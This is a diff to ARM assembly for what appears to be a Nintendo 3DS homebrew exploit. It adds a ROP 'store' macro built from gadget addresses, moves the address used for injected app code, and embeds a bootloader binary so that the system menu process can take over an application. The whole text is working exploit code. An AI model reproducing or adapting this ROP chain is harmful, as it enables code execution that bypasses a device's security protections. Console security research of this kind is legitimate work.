@@ -213,6 +213,15 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 	.word MENU_SLEEP
 .endmacro
 
+.macro store,a,dst
+	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
+		.word a ; r0
+	.word ROP_MENU_POP_R4PC ; pop {r4, pc}
+		.word dst ; r4
+	.word ROP_MENU_STR_R0R4_POP_R4PC
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
 .macro add_and_store,a,b,dst
 	.word ROP_MENU_POP_R0PC ; pop {r0, pc}
 		.word a ; r0
@@ -265,7 +274,8 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 
 		; adjust gsp commands (can't preprocess aliases)
 			add_and_store_3 APP_START_LINEAR, 0xBABE0003, 0 - 0x00100000, MENU_OBJECT_LOC + gxCommandAppHook - object + 0x8
-			add_and_store APP_START_LINEAR, 0x00170000 - 0x00100000, MENU_OBJECT_LOC + gxCommandAppCode - object + 0x8
+			add_and_store APP_START_LINEAR, 0x00105000 - 0x00100000, MENU_OBJECT_LOC + gxCommandAppCode - object + 0x8
+			store MENU_LOADEDROP_BUFADR + appBootloader - object, MENU_OBJECT_LOC + appCode + 0x4
 
 		; takeover app
 			send_gx_cmd MENU_OBJECT_LOC + gxCommandAppHook - object
@@ -340,17 +350,24 @@ DUMMY_PTR equ (MENU_OBJECT_LOC - 4)
 	.align 0x20
 	appHook:
 		.arm
+			nop
+			nop
 			ldr r0, =500*1000*1000 ; 1000ms
 			ldr r1, =0x00000000
 			.word 0xef00000a ; svcSleepThread
-			ldr r2, =0x00170000
+			ldr r2, =0x00105000
 			blx r2
 			
 		.pool
 
 		.fill ((appHook + 0x200) - .), 0xDA
 
+	.align 0x20
 	appCode:
 		.incbin "app_code.bin"
+
+	.align 0x20
+	appBootloader:
+		.incbin "app_bootloader.bin"
 
 .Close
